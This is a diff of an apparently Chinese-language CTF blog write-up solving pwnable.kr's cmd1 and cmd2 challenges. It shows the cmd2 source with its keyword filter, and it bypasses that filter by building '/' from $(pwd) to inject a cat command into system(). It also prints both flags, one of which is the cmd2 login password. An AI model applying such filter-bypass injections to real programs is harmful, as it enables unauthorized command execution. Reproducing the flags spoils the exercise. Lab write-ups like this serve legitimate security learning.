@@ -10186,12 +10186,123 @@ int main(int argc, char* argv[], char** envp){
 }
 ```
 
-虽然`flag`，`sh`，`tmp`都被过滤啦，但是办法还是有的，比如我们可以用`/bin/cat fla*`来将当前目录所有以`fla`开头的文件内容打印到终端。
+虽然`flag`，`sh`，`tmp`都被过滤啦，但是办法还是有的，比如我们可以用`/bin/cat fla*`来将当前目录所有以`fla`开头的文件内容打印到终端，可以得到`flag`：`mommy now I get what PATH environment is for :)`。
 
 ```bash
 cmd1@pwnable:~$ ./cmd1 "/bin/cat fla*"
 mommy now I get what PATH environment is for :)
 ```
+
+------
+
+### cmd2
+
+这是**Pwnable.kr**的第十五个挑战`cmd2`，来自**[Toddler's Bottle]**部分。
+
+```bash
+Daddy bought me a system command shell.
+but he put some filters to prevent me from playing with it without his permission...
+but I wanna play anytime I want!
+
+ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)
+```
+
+首先通过`ssh`远程连接目标主机，需要注意这题的密码是上题的`flag`：`mommy now I get what PATH environment is for :)`。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ ssh cmd2@pwnable.kr -p2222
+cmd2@pwnable.kr's password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
+|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+                                                                     
+- Site admin : daehee87@khu.ac.kr
+- irc.netgarage.org:6667 / #pwnable.kr
+- Simply type "irssi" command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+You have mail.
+Last login: Fri Jun  9 15:41:13 2023 from 12.249.36.98
+```
+
+然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。
+
+```bash
+cmd2@pwnable:~$ ls -la
+total 40
+drwxr-x---   5 root cmd2     4096 Oct 23  2016 .
+drwxr-xr-x 117 root root     4096 Nov 10  2022 ..
+d---------   2 root root     4096 Jul 14  2015 .bash_history
+-r-xr-sr-x   1 root cmd2_pwn 8794 Dec 21  2015 cmd2
+-rw-r--r--   1 root root      586 Dec 21  2015 cmd2.c
+-r--r-----   1 root cmd2_pwn   30 Jul 14  2015 flag
+dr-xr-xr-x   2 root root     4096 Jul 22  2015 .irssi
+drwxr-xr-x   2 root root     4096 Oct 23  2016 .pwntools-cache
+```
+
+我们可以看到三个文件`cmd2`、`cmd2.c`和`flag`，其中`cmd2`是`ELF`二进制可执行文件，`cmd2.c`是编译二进制文件的`C`代码，用户`cmd2`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat cmd2.c`来查看`cmd2.c`的代码。
+
+```bash
+cmd2@pwnable:~$ cat cmd2.c
+#include <stdio.h>
+#include <string.h>
+
+int filter(char* cmd){
+    int r=0;
+    r += strstr(cmd, "=")!=0;
+    r += strstr(cmd, "PATH")!=0;
+    r += strstr(cmd, "export")!=0;
+    r += strstr(cmd, "/")!=0;
+    r += strstr(cmd, "`")!=0;
+    r += strstr(cmd, "flag")!=0;
+    return r;
+}
+
+extern char** environ;
+void delete_env(){
+    char** p;
+    for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
+}
+
+int main(int argc, char* argv[], char** envp){
+    delete_env();
+    putenv("PATH=/no_command_execution_until_you_become_a_hacker");
+    if(filter(argv[1])) return 0;
+    printf("%s\n", argv[1]);
+    system( argv[1] );
+    return 0;
+}
+```
+
+我们可以看到更多的关键字被过滤啦，包括`=`，`PATH`，`export`，`/`，`flag`和`，同时环境变量中的值全被清空啦。
+
+程序还用`putenv`将环境变量`PATH`设置为`/no_command_execution_until_you_become_a_hacker`。先来想办法得到最重要的`/`。
+
+```bash
+cmd2@pwnable:~$ pwd
+/home/cmd2
+cmd2@pwnable:~$ cd /
+cmd2@pwnable:/$ pwd
+/
+cmd2@pwnable:/$ echo $(pwd)  # 这样的话使用 $(pwd) 同样可以得到 /
+/
+```
+
+接着就很简单啦，用和上一题类似的办法，需要注意的是我们应该使用单引号`'`而不是双引号`"`。因为在单引号内部，变量和命令将不会被展开或解析，单引号中的内容被视为字面字符串，保留原始形式。例如，在`'$pwd'`中，`$pwd`不会被替换为实际的当前目录路径，而是会被当作字符串 `"$pwd"`。而在双引号内部，变量和命令会被展开或解析，因此双引号内的内容会进行变量替换和命令替换。例如，在`"$pwd"`中，`$pwd`会被替换为实际的当前目录路径。
+
+```bash
+cmd2@pwnable:/$ /home/cmd2/cmd2 "$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*"
+cmd2@pwnable:/$ /home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*'
+$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*
+FuN_w1th_5h3ll_v4riabl3s_haha
+```
+
+提交`flag`：`FuN_w1th_5h3ll_v4riabl3s_haha`即可。
 
 ------
 
